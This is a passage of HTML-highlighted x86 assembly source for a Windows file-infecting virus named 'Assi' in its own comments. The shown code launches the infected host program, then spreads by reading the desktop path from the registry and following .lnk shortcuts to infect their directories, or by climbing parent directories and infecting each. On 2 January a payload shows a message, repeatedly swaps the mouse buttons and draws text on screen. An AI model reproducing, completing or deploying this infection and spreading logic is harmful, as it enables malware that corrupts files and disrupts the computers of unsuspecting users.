</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc0">                </span><span class="sc1">;get virus filename</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;clear the first "</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AssiFile</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">                   </span><span class="sc1">;copy string</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AssiFile</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetPoint</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4d</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AssiFile</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">                   </span><span class="sc1">;to get hosts name</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetPoint</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">5359532Eh</span><span class="sc0">           </span><span class="sc1">;rename to .SYS</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ProcessInfo</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StartupInfo</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HostFile</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc0">             </span><span class="sc1">;run the host file</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Restore HostName and run Host-END-----------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Save Current Directory----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentDir</span><span class="sc0">              </span><span class="sc1">;save the current dir, for CD_Method</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260d</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Save Current Directory-END------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----LNK_Method or CD_Method?--------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME</span><span class="sc0">              </span><span class="sc1">;get the day</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc0">              </span><span class="sc1">; *.lnk search method &lt; 15th &lt; cd.. method</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wDay</span><span class="sc4">],</span><span class="sc2">15</span><span class="sc0">
</span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">CD_Method</span><span class="sc0">                   </span><span class="sc1">; if over 15th do the CD_Method</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----LNK_Method or CD_Method?-END----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----*LNK_Method* Get Desktop Dir----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegHandle</span><span class="sc0">               </span><span class="sc1">;get the desktop folder with the registry</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">001F0000h</span><span class="sc0">                  </span><span class="sc1">;r&amp;w</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SubKey</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000001h</span><span class="sc0">                  </span><span class="sc1">;HKEY_CURRENT_USER</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">

</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;error?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CD_Method</span><span class="sc0">                   </span><span class="sc1">;if yes do the method</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">Size</span><span class="sc0">                </span><span class="sc1">;read desktop folder and save</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Desktop</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lpType</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Value</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc0">

</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;error</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CD_Method</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">                </span><span class="sc1">;close handle</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Desktop</span><span class="sc0">             </span><span class="sc1">;change dir</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Get Desktop Dir-END-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Search *.lnk and scan for Directory---------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">         </span><span class="sc1">;search for *.lnk</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LNKmask</span><span class="sc0">             </span><span class="sc1">;*.lnk</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LNKfindhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;save handle</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;nothing found?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CD_Method</span><span class="sc0">                    </span><span class="sc1">;other method</span><span class="sc0">

</span><span class="sc5">FindNextLNK</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;find more filez</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;no more?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CheckPayload</span><span class="sc0">                 </span><span class="sc1">;then check for day and month</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">;open the *.lnk file to get the dir</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileBuffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenFile</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LNKhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;save handle</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ReadBuffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2000d</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LNKhandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LNKhandle</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;close handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Buffer</span><span class="sc4">+</span><span class="sc2">103d</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;go 103d after buffer:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;null</span><span class="sc0">

</span><span class="sc5">SearchDir</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;get it now</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CopyDir</span><span class="sc0">                  </span><span class="sc1">;if found C: copy dir</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchDir</span><span class="sc0">

</span><span class="sc5">CopyDir</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;Copy it to string</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2d</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path</span><span class="sc0">             </span><span class="sc1">;to path in data?:</span><span class="sc0">
</span><span class="sc5">Copy</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">HaveDir</span><span class="sc0">                  </span><span class="sc1">;ive got it</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Copy</span><span class="sc0">                    </span><span class="sc1">;search again</span><span class="sc0">

</span><span class="sc5">HaveDir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path</span><span class="sc0">             </span><span class="sc1">;get point to generate full dir</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetPoint</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSlash</span><span class="sc0">                   </span><span class="sc1">;make the dir</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path</span><span class="sc0">                </span><span class="sc1">;change to this dir</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectCurrentDir</span><span class="sc0">               </span><span class="sc1">;infect all files in dir</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Desktop</span><span class="sc0">             </span><span class="sc1">;more lnks!</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">         </span><span class="sc1">;search more</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LNKfindhandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindNextLNK</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Search *.lnk and scan for Directory-END-----------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Payload-------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CheckPayload</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wMonth</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">;1th month + 2th day = payload  =)</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wDay</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;little message</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oTitle</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oMsg</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;visual</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DisplayDC</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateDCA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DChandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;save handle</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DChandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetTextColor</span><span class="sc0">               </span><span class="sc1">;black</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc0">                     </span><span class="sc1">;transparent</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DChandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetBkMode</span><span class="sc0">

</span><span class="sc5">Payload</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;=))</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">;swap mouse button</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SwapMouseButton</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">POINT</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCursorPos</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20d</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">x</span><span class="sc0">                   </span><span class="sc1">;x coor +20</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8d</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AssiDiA</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">y</span><span class="sc0">                      </span><span class="sc1">;y coor</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">                      </span><span class="sc1">;x coor</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DChandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">TextOutA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;swap agian...</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SwapMouseButton</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Payload</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Payload-END---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----*CD_Method* Generate Directorys and infect--------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CD_Method</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;cd..</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentDir</span><span class="sc0">              </span><span class="sc1">;if error in the LNK_Method, set from</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">           </span><span class="sc1">;desktop folder to current folder on start</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AssiFile</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CDdotdot</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">                   </span><span class="sc1">;copy string to use</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CDdotdot</span><span class="sc0">             </span><span class="sc1">;not need</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetPoint</span><span class="sc0">                   </span><span class="sc1">;prepare for cd.. method</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">MakeDir</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;generate the name</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SetDir</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">':'</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">                     </span><span class="sc1">;now at C:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">MakeDir</span><span class="sc0">

</span><span class="sc5">SetDir</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2d</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CDdotdot</span><span class="sc0">                </span><span class="sc1">;set dir to infect</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectCurrentDir</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">MakeDir</span><span class="sc0">                 </span><span class="sc1">;again...</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Generate Directorys and infect-END----------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Exit Assi-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Exit Assi-END-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">



